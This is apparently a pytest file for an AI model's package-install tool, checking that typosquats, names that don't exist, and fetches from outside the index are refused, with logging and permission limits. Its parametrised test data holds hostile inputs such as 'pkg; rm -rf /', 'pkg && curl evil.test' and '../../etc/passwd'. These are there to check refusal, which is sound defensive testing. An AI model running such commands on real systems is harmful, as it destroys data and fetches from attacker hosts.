"""Installing a dependency without installing a lie.

`pip install` runs code from the package at install time, so a name that is
wrong does not fail politely -- it executes. These tests are about the two
ways a name gets to be wrong: a model inventing one, and a squatter sitting
on the near-miss of a real one.
"""
from __future__ import annotations

from types import SimpleNamespace

import pytest

from app.packages import PackageInstaller, _distance


class FakeIndex:
    """Stands in for PyPI, so nothing here touches the network."""

    def __init__(self, known: dict[str, str] | None = None) -> None:
        self.known = known or {"requests": "2.32.0", "httpx": "0.28.1"}
        self.asked: list[str] = []

    def get(self, url, **kwargs):
        name = url.rstrip("/").split("/")[-2]
        self.asked.append(name)
        if name not in self.known:
            return SimpleNamespace(status_code=404, json=lambda: {})
        return SimpleNamespace(
            status_code=200,
            json=lambda: {"info": {"name": name, "version": self.known[name],
                                   "summary": "a real package"}},
        )


@pytest.fixture
def installer(tmp_path) -> PackageInstaller:
    return PackageInstaller(journal=tmp_path / "installed.jsonl", http=FakeIndex())


# --------------------------------------------------- a name, not a fetch


@pytest.mark.parametrize(
    "hostile",
    [
        "git+https://example.com/evil.git",
        "https://example.com/pkg.tar.gz",
        "requests --index-url http://evil.test/simple",
        "../../etc/passwd",
        "pkg; rm -rf /",
        "pkg && curl evil.test",
        "-e /tmp/local",
        "file:///tmp/thing",
    ],
)
def test_anything_that_fetches_from_elsewhere_is_refused(installer, hostile):
    """These are the forms that get code from somewhere other than the index."""
    assert installer.validate_name(hostile) is not None
    assert not installer.review(hostile)["installable"]


@pytest.mark.parametrize("name", ["requests", "httpx", "scikit-learn", "python-dateutil", "a"])
def test_ordinary_names_are_accepted(installer, name):
    assert installer.validate_name(name) is None


def test_an_empty_name_is_refused(installer):
    assert installer.validate_name("  ") is not None


# ------------------------------------------------------------- typosquats


@pytest.mark.parametrize(
    "squat,real",
    [("requsts", "requests"), ("reqests", "requests"), ("numpyy", "numpy"),
     ("pandsa", "pandas"), ("pydantc", "pydantic")],
)
def test_a_near_miss_of_a_popular_package_is_refused(installer, squat, real):
    """One character from a real name is how typosquatting works."""
    verdict = installer.review(squat)
    assert not verdict["installable"]
    assert verdict["did_you_mean"] == real
    assert real in verdict["refused_because"]


def test_the_real_package_is_not_mistaken_for_a_squat_of_itself(installer):
    assert installer.typosquat_risk("requests") is None
    assert installer.review("requests")["installable"]


def test_short_names_are_not_flagged_on_a_single_edit(installer):
    """One edit on a short name is coincidence, not a squat."""
    assert installer.typosquat_risk("six") is None
    assert installer.typosquat_risk("pip") is None


def test_distance_is_computed_correctly():
    assert _distance("requests", "requests") == 0
    assert _distance("requsts", "requests") == 1
    assert _distance("abc", "xyz") == 3


# ------------------------------------------------- a name that does not exist


def test_a_package_that_does_not_exist_is_refused(installer):
    """A model asked for a library it half-remembers produces a plausible
    name. An unregistered name is exactly what someone else can register
    later, precisely because assistants keep asking for it."""
    verdict = installer.review("totally-invented-helper-lib")
    assert not verdict["installable"]
    assert "no package called" in verdict["refused_because"]


def test_an_unreachable_index_refuses_rather_than_guessing(tmp_path):
    class Down:
        def get(self, *args, **kwargs):
            raise ConnectionError("offline")

    installer = PackageInstaller(journal=tmp_path / "j.jsonl", http=Down())
    assert not installer.review("requests")["installable"]


def test_a_real_package_reports_what_it_is(installer):
    verdict = installer.review("httpx")
    assert verdict["installable"]
    assert verdict["package"]["version"] == "0.28.1"


# ------------------------------------------------------------ installing


def test_a_refused_package_is_never_handed_to_pip(installer, monkeypatch):
    import subprocess

    def forbidden(*args, **kwargs):
        raise AssertionError("pip must not run for a refused name")

    monkeypatch.setattr(subprocess, "run", forbidden)
    result = installer.install("requsts", reason="typo")
    assert not result.ok and result.refused_because


def test_installing_targets_this_environment_only(installer, monkeypatch):
    import subprocess
    import sys

    seen = {}

    def capture(command, **kwargs):
        seen["command"] = command
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(subprocess, "run", capture)
    installer.install("requests", reason="needed for http")

    assert seen["command"][0] == sys.executable, "must install into this venv"
    assert "--user" not in seen["command"]
    assert "--index-url" not in seen["command"]


def test_the_session_limit_stops_unattended_bulk_installs(tmp_path, monkeypatch):
    """An assistant that installs forty packages unattended has stopped being
    helpful and started being a supply chain."""
    import subprocess

    installer = PackageInstaller(journal=tmp_path / "j.jsonl", http=FakeIndex(),
                                 session_limit=2)
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **k: SimpleNamespace(returncode=0, stdout="ok", stderr=""))

    assert installer.install("requests").ok
    assert installer.install("httpx").ok
    third = installer.install("requests")
    assert not third.ok
    assert "already installed" in third.refused_because


# --------------------------------------------------------------- the record


def test_every_attempt_is_written_down_including_refusals(installer, monkeypatch):
    import subprocess

    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **k: SimpleNamespace(returncode=0, stdout="ok", stderr=""))
    installer.install("requests", reason="http client")
    installer.install("requsts", reason="typo")

    history = installer.history()
    assert len(history) == 2
    assert any(row["ok"] for row in history)
    assert any(row["refused_because"] for row in history)


def test_status_says_which_environment_is_used(installer):
    import sys

    assert installer.status()["environment"] == sys.executable


# ------------------------------------------------------------- through tools


def test_the_learner_and_web_content_can_never_install():
    """The one version of this that is genuinely dangerous."""
    from app.safety.authority import ActionRequest, AuthorityManager, Decision, Principal

    authority = AuthorityManager(owner_mode=True)
    assert authority.evaluate(ActionRequest(
        tool="install_package", category="install_package_project")).decision is Decision.ALLOW

    for principal in (Principal.BACKGROUND_LEARNER, Principal.UNTRUSTED_EXTERNAL_CONTENT):
        decision = authority.evaluate(ActionRequest(
            tool="install_package", category="install_package_project", principal=principal))
        assert decision.decision is Decision.DENY, f"{principal.value} reached package install"


def test_the_tools_are_registered_where_the_kernel_expects_them():
    from app.safety.permissions import PermissionManager
    from app.tools.packages import register_package_tools
    from app.tools.registry import ToolRegistry

    registry = ToolRegistry(PermissionManager())
    register_package_tools(registry)

    assert registry.get("install_package").permission == "install_package_project"
    assert registry.get("check_package").permission == "dependency_inspect"


def test_a_refusal_comes_back_as_a_fact_not_an_exception(tmp_path):
    from app.safety.permissions import PermissionManager
    from app.tools.packages import register_package_tools
    from app.tools.registry import ToolRegistry

    registry = ToolRegistry(PermissionManager())
    register_package_tools(registry, PackageInstaller(journal=tmp_path / "j.jsonl",
                                                      http=FakeIndex()))
    result = registry.execute("install_package", {"name": "requsts"})

    assert result.success, "the tool call itself should not blow up"
    assert result.output["error"]
    assert "requests" in result.output["error"]
